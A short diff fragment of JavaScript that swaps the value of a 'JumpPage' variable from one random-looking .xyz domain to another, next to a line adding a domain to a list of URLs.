@@ -42,7 +42,7 @@ var urls=[];
         urls.push(".urmlkizv.cc");
         
            	
-var JumpPage="https://cxlgvbw.xyz";
+var JumpPage="https://iibymqub.xyz";
 
 var newestUrls = [];
 
